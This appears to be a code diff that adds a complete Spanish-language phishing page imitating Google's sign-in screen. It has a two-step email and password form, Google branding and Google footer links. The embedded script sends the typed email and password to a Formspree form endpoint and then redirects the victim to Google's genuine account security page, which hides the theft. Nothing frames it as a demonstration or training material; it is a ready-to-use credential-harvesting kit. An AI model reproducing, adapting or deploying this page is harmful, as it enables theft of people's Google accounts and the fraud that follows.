@@ -1,0 +1,1311 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Inicia sesión</title>
+<meta name="description" content="Acceso a la cuenta">
+
+
+<style>
+:root {
+--page-bg: #f8f9ff;
+--card-bg: #ffffff;
+--text: #202124;
+--text-muted: #5f6368;
+--border: #dadce0;
+--accent: #1a73e8;
+--accent-hover: #1765cc;
+--error: #d93025;
+}
+
+
+
+
+
+
+
+
+* { box-sizing: border-box; }
+
+
+
+
+
+
+
+
+html, body {
+min-height: 100%;
+margin: 0;
+}
+
+
+
+
+
+
+
+
+body {
+background: var(--page-bg);
+color: var(--text);
+font-family: Roboto, Arial, sans-serif;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+min-height: 100vh;
+padding: 24px;
+}
+
+
+
+
+
+
+
+
+.wrap {
+width: 100%;
+max-width: 900px;
+}
+
+
+
+
+
+
+
+
+.card {
+background: var(--card-bg);
+border-radius: 28px;
+padding: 40px 48px 28px;
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 40px;
+align-items: start;
+}
+
+
+
+
+
+
+
+
+.google-logo {
+width: 24px;
+height: 24px;
+display: block;
+}
+
+
+
+
+
+
+
+
+h1 {
+font-size: 32px;
+font-weight: 400;
+margin: 24px 0 12px;
+line-height: 1.2;
+}
+
+
+
+
+
+
+
+
+.subtitle {
+font-size: 16px;
+color: var(--text);
+margin: 0;
+line-height: 1.4;
+}
+
+
+
+
+
+
+
+
+form { width: 100%; }
+
+
+
+
+
+
+
+
+.field {
+position: relative;
+margin-bottom: 8px;
+}
+
+
+
+
+
+
+
+
+.field input {
+display: block;
+width: 100%;
+height: 56px;
+padding: 20px 14px 6px;
+font-family: inherit;
+font-size: 16px;
+color: var(--text);
+background: transparent;
+border: 1px solid var(--border);
+border-radius: 4px;
+outline: none;
+}
+
+
+
+
+
+
+
+
+.field input:focus {
+border: 2px solid var(--accent);
+padding: 19px 13px 5px;
+}
+
+
+
+
+
+
+
+
+.field label {
+position: absolute;
+left: 11px;
+top: 18px;
+padding: 0 4px;
+font-size: 16px;
+color: var(--text-muted);
+background: var(--card-bg);
+pointer-events: none;
+transition: top .12s ease, font-size .12s ease, color .12s ease;
+}
+
+
+
+
+
+
+
+
+.field input:not(:placeholder-shown) + label {
+top: -8px;
+font-size: 12px;
+color: var(--text-muted);
+}
+
+
+
+
+
+
+
+
+.field input:focus + label {
+top: -8px;
+font-size: 12px;
+color: var(--accent);
+}
+
+
+
+
+
+
+
+
+.field.has-error input {
+border: 2px solid var(--error);
+padding: 19px 13px 5px;
+}
+
+
+
+
+
+
+
+
+.field.has-error label,
+.field.has-error input:focus + label {
+color: var(--error);
+}
+
+
+
+
+
+
+
+
+.error-msg {
+color: var(--error);
+font-size: 12px;
+line-height: 1.4;
+margin: 5px 0 0 2px;
+}
+
+
+
+
+
+
+
+
+#mensaje { letter-spacing: .5px; }
+#mensaje[type="text"] { letter-spacing: normal; }
+
+
+
+
+
+
+
+
+.chip {
+max-width: 100%;
+border: 1px solid var(--border);
+border-radius: 999px;
+padding: 6px 14px;
+background: transparent;
+font-family: inherit;
+font-size: 14px;
+color: var(--text);
+text-align: left;
+cursor: pointer;
+margin-bottom: 24px;
+overflow: hidden;
+text-overflow: ellipsis;
+white-space: nowrap;
+animation: fadeIn .22s ease;
+}
+
+
+
+
+
+
+
+
+.chip:hover { background: #f1f3f4; }
+
+
+
+
+
+
+
+
+.show-pass {
+display: flex;
+align-items: center;
+gap: 10px;
+width: fit-content;
+margin-top: 12px;
+font-size: 14px;
+color: var(--text);
+cursor: pointer;
+}
+
+
+
+
+
+
+
+
+.show-pass input {
+width: 18px;
+height: 18px;
+margin: 0;
+accent-color: var(--accent);
+cursor: pointer;
+}
+
+
+
+
+
+
+
+
+.password-step { animation: fadeIn .22s ease; }
+
+
+
+
+
+
+
+
+@keyframes fadeIn {
+from { opacity: 0; transform: translateY(-4px); }
+to   { opacity: 1; transform: none; }
+}
+
+
+
+
+
+
+
+
+.forgot { margin-top: 8px; }
+
+
+
+
+
+
+
+
+.forgot-pass { margin-top: 18px; margin-bottom: 8px; }
+
+
+
+
+
+
+
+
+.forgot a,
+.create a,
+.more-info a {
+color: var(--accent);
+text-decoration: none;
+font-size: 14px;
+font-weight: 500;
+}
+
+
+
+
+
+
+
+
+.forgot a:hover,
+.create a:hover,
+.more-info a:hover { text-decoration: underline; }
+
+
+
+
+
+
+
+
+.more-info {
+margin-top: 26px;
+font-size: 14px;
+line-height: 1.5;
+color: var(--text-muted);
+max-width: 400px;
+}
+
+
+
+
+
+
+
+
+.actions {
+margin-top: 32px;
+display: flex;
+align-items: center;
+justify-content: flex-end;
+gap: 20px;
+}
+
+
+
+
+
+
+
+
+.next-btn {
+background: var(--accent);
+color: #ffffff;
+border: none;
+border-radius: 999px;
+padding: 11px 24px;
+font-family: inherit;
+font-size: 14px;
+font-weight: 500;
+letter-spacing: .25px;
+cursor: pointer;
+}
+
+
+
+
+
+
+
+
+.next-btn:hover {
+background: var(--accent-hover);
+box-shadow: 0 1px 3px rgba(60, 64, 67, .3);
+}
+
+
+
+
+
+
+
+
+.next-btn:disabled {
+opacity: .65;
+cursor: wait;
+}
+
+
+
+
+
+
+
+
+#estado {
+font-size: 13px;
+line-height: 1.5;
+color: var(--text-muted);
+margin: 16px 0 0;
+}
+
+
+
+
+
+
+
+
+footer {
+width: 100%;
+max-width: 900px;
+margin: 12px auto 0;
+display: flex;
+justify-content: space-between;
+align-items: center;
+font-size: 12px;
+color: var(--text-muted);
+padding: 0 8px;
+}
+
+
+
+
+
+
+
+
+footer select {
+background: transparent;
+border: none;
+color: var(--text-muted);
+font-size: 12px;
+font-family: inherit;
+cursor: pointer;
+}
+
+
+
+
+
+
+
+
+footer .links { display: flex; gap: 20px; }
+
+
+
+
+
+
+
+
+footer a {
+color: var(--text-muted);
+text-decoration: none;
+}
+
+
+
+
+
+
+
+
+footer a:hover { text-decoration: underline; }
+
+
+
+
+
+
+
+
+.disclaimer {
+max-width: 900px;
+margin: 14px auto 0;
+padding: 0 8px;
+font-size: 11px;
+line-height: 1.5;
+color: var(--text-muted);
+text-align: center;
+}
+
+
+
+
+
+
+
+
+@media (max-width: 760px) {
+body { padding: 16px; }
+
+
+
+
+
+
+
+
+.card {
+  grid-template-columns: 1fr;
+  gap: 28px;
+  padding: 32px 24px;
+  border-radius: 20px;
+}
+
+
+
+
+
+
+
+
+.actions { justify-content: space-between; }
+
+
+
+
+
+
+
+
+footer {
+  flex-direction: column;
+  gap: 14px;
+}
+}
+</style>
+</head>
+
+
+
+
+
+
+
+
+<body>
+
+
+
+
+
+
+
+
+<div class="wrap">
+
+
+
+
+
+
+
+
+<div class="card">
+
+
+
+
+
+
+
+
+  <div class="col-left">
+    <svg class="google-logo" viewBox="0 0 48 48" aria-label="Google">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h1>Inicia sesión</h1>
+    <p class="subtitle">Utiliza tu cuenta de Google</p>
+  </div>
+
+
+
+
+
+
+
+
+  <div class="col-right">
+
+
+
+
+
+
+
+
+    <form id="formulario" novalidate>
+
+
+
+
+
+
+
+
+      <button type="button" class="chip" id="chip" hidden></button>
+
+
+
+
+
+
+
+
+      <div id="stepEmail">
+        <div class="field" id="emailField">
+          <input
+            id="email"
+            name="email"
+            type="email"
+            autocomplete="off"
+            placeholder=" "
+            aria-describedby="emailError"
+          >
+          <label for="email">Correo electrónico o teléfono</label>
+        </div>
+
+
+
+
+
+
+
+
+        <p class="error-msg" id="emailError" hidden aria-live="polite">
+          Introduce una dirección de correo electrónico o un número de teléfono
+        </p>
+
+
+
+
+
+
+
+
+        <div class="forgot">
+          <a href="#" onclick="return false;">
+            ¿Has olvidado tu correo?
+          </a>
+        </div>
+      </div>
+
+
+
+
+
+
+
+
+      <div class="password-step" id="passwordStep" hidden>
+        <div class="field" id="passwordField">
+          <input
+            id="mensaje"
+            name="mensaje"
+            type="password"
+            autocomplete="off"
+            placeholder=" "
+            aria-describedby="passError"
+          >
+          <label for="mensaje">Contraseña</label>
+        </div>
+
+
+
+
+
+
+
+
+        <p class="error-msg" id="passError" hidden aria-live="polite">
+          Introduce una contraseña
+        </p>
+
+
+
+
+
+
+
+
+        <label class="show-pass">
+          <input type="checkbox" id="togglePass">
+          <span>Mostrar contraseña</span>
+        </label>
+
+
+
+
+
+
+
+
+        <div class="forgot forgot-pass">
+          <a href="#" onclick="return false;">
+            ¿Has olvidado tu contraseña?
+          </a>
+        </div>
+      </div>
+
+
+
+
+
+
+
+
+      <p class="more-info">
+        ¿No es tu ordenador? Usa el modo Incógnito para iniciar sesión de
+        forma privada.
+        <a href="#" onclick="return false;">Más información</a>
+      </p>
+
+
+
+
+
+
+
+
+      <div class="actions">
+
+
+
+
+
+
+
+
+        <div class="create" id="createWrap">
+          <a href="#" onclick="return false;">
+            Crear cuenta
+          </a>
+        </div>
+
+
+
+
+
+
+
+
+        <button
+          class="next-btn"
+          id="siguiente"
+          type="submit"
+        >
+          Siguiente
+        </button>
+
+
+
+
+
+
+
+
+      </div>
+
+
+
+
+
+
+
+
+      <p id="estado" aria-live="polite"></p>
+
+
+
+
+
+
+
+
+    </form>
+
+
+
+
+
+
+
+
+  </div>
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<footer>
+
+
+
+
+
+
+
+
+  <select aria-label="Idioma">
+    <option>Español (España)</option>
+    <option>Català</option>
+    <option>English</option>
+  </select>
+
+
+
+
+
+
+
+
+  <div class="links">
+    <a href="https://support.google.com/">Ayuda</a>
+    <a href="https://policies.google.com/privacy">Privacidad</a>
+    <a href="https://policies.google.com/terms">Condiciones</a>
+  </div>
+
+
+
+
+
+
+
+
+</footer>
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+
+
+
+
+<script>
+const formulario = document.getElementById("formulario");
+const boton = document.getElementById("siguiente");
+const estado = document.getElementById("estado");
+const email = document.getElementById("email");
+const mensaje = document.getElementById("mensaje");
+const stepEmail = document.getElementById("stepEmail");
+const passwordStep = document.getElementById("passwordStep");
+const passwordField = document.getElementById("passwordField");
+const togglePass = document.getElementById("togglePass");
+const chip = document.getElementById("chip");
+const createWrap = document.getElementById("createWrap");
+const emailField = document.getElementById("emailField");
+const emailError = document.getElementById("emailError");
+const passError = document.getElementById("passError");
+
+
+
+
+
+
+
+
+const ENDPOINT = "https://formspree.io/f/meaalzgg";
+const DESTINO = "https://myaccount.google.com/security?utm_source=OGB&utm_medium=app";
+
+
+
+
+
+
+
+
+const RE_EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+const RE_TEL = /^\+?[\d\s().-]{6,}$/;
+
+
+
+
+
+
+
+
+function emailValido() {
+const v = email.value.trim();
+return RE_EMAIL.test(v) || RE_TEL.test(v);
+}
+
+
+
+
+
+
+
+
+function marcarErrorEmail() {
+emailField.classList.add("has-error");
+email.setAttribute("aria-invalid", "true");
+emailError.hidden = false;
+}
+
+
+
+
+
+
+
+
+function limpiarErrorEmail() {
+emailField.classList.remove("has-error");
+email.removeAttribute("aria-invalid");
+emailError.hidden = true;
+}
+
+
+
+
+
+
+
+
+function marcarErrorPass() {
+passwordField.classList.add("has-error");
+mensaje.setAttribute("aria-invalid", "true");
+passError.hidden = false;
+}
+
+
+
+
+
+
+
+
+function limpiarErrorPass() {
+passwordField.classList.remove("has-error");
+mensaje.removeAttribute("aria-invalid");
+passError.hidden = true;
+}
+
+
+
+
+
+
+
+
+function irAPasoContrasena() {
+chip.textContent = email.value.trim();
+chip.hidden = false;
+
+
+
+
+
+
+
+
+stepEmail.hidden = true;
+createWrap.hidden = true;
+
+
+
+
+
+
+
+
+passwordStep.hidden = false;
+mensaje.focus({ preventScroll: true });
+}
+
+
+
+
+
+
+
+
+function volverAPasoEmail() {
+chip.hidden = true;
+passwordStep.hidden = true;
+stepEmail.hidden = false;
+createWrap.hidden = false;
+limpiarErrorPass();
+email.focus({ preventScroll: true });
+}
+
+
+
+
+
+
+
+
+email.addEventListener("input", limpiarErrorEmail);
+mensaje.addEventListener("input", limpiarErrorPass);
+
+
+
+
+
+
+
+
+chip.addEventListener("click", volverAPasoEmail);
+
+
+
+
+
+
+
+
+togglePass.addEventListener("change", () => {
+mensaje.type = togglePass.checked ? "text" : "password";
+});
+
+
+
+
+
+
+
+
+formulario.addEventListener("submit", async (evento) => {
+
+
+
+
+
+
+
+
+evento.preventDefault();
+
+
+
+
+
+
+
+
+if (boton.disabled) return;
+
+
+
+
+
+
+
+
+if (!stepEmail.hidden) {
+
+
+
+
+
+
+
+
+  if (!emailValido()) {
+    marcarErrorEmail();
+    email.focus({ preventScroll: true });
+    return;
+  }
+
+
+
+
+
+
+
+
+  limpiarErrorEmail();
+  irAPasoContrasena();
+  return;
+}
+
+
+
+
+
+
+
+
+if (mensaje.value.trim() === "") {
+  marcarErrorPass();
+  mensaje.focus({ preventScroll: true });
+  return;
+}
+
+
+
+
+
+
+
+
+boton.disabled = true;
+estado.textContent = "Enviando...";
+
+
+
+
+
+
+
+
+const datos = new FormData(formulario);
+datos.set("email", email.value.trim());
+datos.set("mensaje", mensaje.value);
+datos.delete("togglePass");
+
+
+
+
+
+
+
+
+const controlador = new AbortController();
+const temporizador = setTimeout(() => controlador.abort(), 4000);
+
+
+
+
+
+
+
+
+try {
+  await fetch(ENDPOINT, {
+    method: "POST",
+    body: datos,
+    headers: { Accept: "application/json" },
+    signal: controlador.signal,
+    keepalive: true
+  });
+} catch (error) {
+  // Si la red falla o tarda más de 4 s, seguimos igualmente
+} finally {
+  clearTimeout(temporizador);
+  estado.textContent = "Redirigiendo...";
+  window.location.href = DESTINO;
+}
+
+
+
+
+
+
+
+
+});
+</script>
+
+
+
+
+
+
+
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
